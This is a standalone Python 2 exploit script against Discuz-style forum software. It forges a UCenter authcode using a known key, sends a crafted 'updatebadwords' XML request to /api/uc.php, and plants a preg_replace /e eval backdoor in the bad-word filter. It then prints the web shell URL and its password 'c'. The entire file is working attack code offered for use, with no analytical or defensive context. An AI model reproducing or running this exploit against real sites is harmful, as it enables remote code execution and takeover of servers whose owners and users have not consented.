import sys

import hashlib

import time

import math

import base64

import urllib2

import urllib

import re

import requests

import json

global cookie

global formhash



def microtime(get_as_float = False) :

    if get_as_float:

        return time.time()

    else:

        return '%.8f %d' % math.modf(time.time())



def get_authcode(string, key = ''):

    ckey_length = 4

    key = hashlib.md5(key).hexdigest()

    keya = hashlib.md5(key[0:16]).hexdigest()

    keyb = hashlib.md5(key[16:32]).hexdigest()

    keyc = (hashlib.md5(microtime()).hexdigest())[-ckey_length:]

    cryptkey = keya + hashlib.md5(keya+keyc).hexdigest()

    key_length = len(cryptkey)

    string = '0000000000' + (hashlib.md5(string+keyb)).hexdigest()[0:16]+string

    string_length = len(string)

    result = ''

    box = range(0, 256)

    rndkey = dict()

    for i in range(0,256):

        rndkey[i] = ord(cryptkey[i % key_length])

    j=0

    for i in range(0,256):

        j = (j + box[i] + rndkey[i]) % 256

        tmp = box[i]

        box[i] = box[j]

        box[j] = tmp

    a=0

    j=0

    for i in range(0,string_length):

        a = (a + 1) % 256

        j = (j + box[a]) % 256

        tmp = box[a]

        box[a] = box[j]

        box[j] = tmp

        result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))

        length=len(result)

    return keyc + base64.b64encode(result).replace('=', '')

def get_cookie_formhash(host):

    global cookie

    global formhash

    headers = {'content-type': 'application/json'}

    r=requests.get(host,headers=headers)

    cookie=r.cookies

    hash=re.findall(r'formhash" value="[0-9A-z]{1,10}"',r.text)

    _formhash=re.findall(r'"[0-9A-z]{1,10}"',hash[0])

    formhash=_formhash[0].replace('"','')

def getshell(host,key):

    global cookie

    global formhash

    header = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64)'}

    tm=time.time()+10*3600

    agent=hashlib.md5("Mozilla/5.0 (Windows NT 6.1; WOW64)")

    string="agent=%s&time=%s&action=updatebadwords" % (agent,tm)

    code=urllib.quote(get_authcode(string,key))

    get_cookie_formhash(host)

    url="%s/api/uc.php?code=%s&formhash=%s" % (host,code,formhash)

    payload='''<?xml version="1.0" encoding="ISO-8859-1"?>

<root>

<item id="0">

<item id="findpattern">/admin/e</item>

  <item id="replacement">@preg_replace(chr(47).chr(47).chr(101),$_POST[c],chr(098));</item>

  </item>

</root>'''

    r=requests.post(url,data=payload,cookies=cookie,headers=header)

    print url

    print r.text

    if re.findall('^1',r.text):

        print 'success shell is %s/forum.php?mod=ajax&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=checkusername&username=admin    password is c' % (host)



if __name__ == '__main__':

    commands=sys.argv[1:2]

    keys=sys.argv[2:]

    args="".join(commands)

    argss="".join(keys)

    print args,argss

    if len(args) < 5:

        sys.exit()

    else:

        getshell(args,argss)